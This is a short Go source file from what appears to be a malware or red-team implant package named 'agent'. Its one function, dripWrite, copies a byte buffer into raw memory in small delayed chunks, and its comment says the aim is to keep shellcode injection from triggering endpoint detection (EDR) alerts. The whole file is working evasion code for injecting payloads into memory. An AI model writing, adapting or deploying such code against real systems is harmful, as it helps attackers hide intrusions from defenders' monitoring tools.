package agent

import (
	"strconv"
	"time"
	"unsafe"
)

// dripWrite writes data to dst in small chunks with delays between each chunk.
// Used to avoid large single-allocation write events that can trigger EDR alerts
// for shellcode injection. If DripChunkSize==0 or dst==0, writes all at once.
func dripWrite(dst uintptr, data []byte) {
	chunkSize, _ := strconv.Atoi(DripChunkSize)
	delayMs, _ := strconv.Atoi(DripDelayMs)
	if chunkSize <= 0 || dst == 0 {
		if dst != 0 {
			for i, b := range data {
				*(*byte)(unsafe.Pointer(dst + uintptr(i))) = b
			}
		}
		return
	}
	delay := time.Duration(delayMs) * time.Millisecond
	for off := 0; off < len(data); off += chunkSize {
		end := off + chunkSize
		if end > len(data) {
			end = len(data)
		}
		chunk := data[off:end]
		for i, b := range chunk {
			*(*byte)(unsafe.Pointer(dst + uintptr(off+i))) = b
		}
		if delay > 0 && end < len(data) {
			time.Sleep(delay)
		}
	}
}
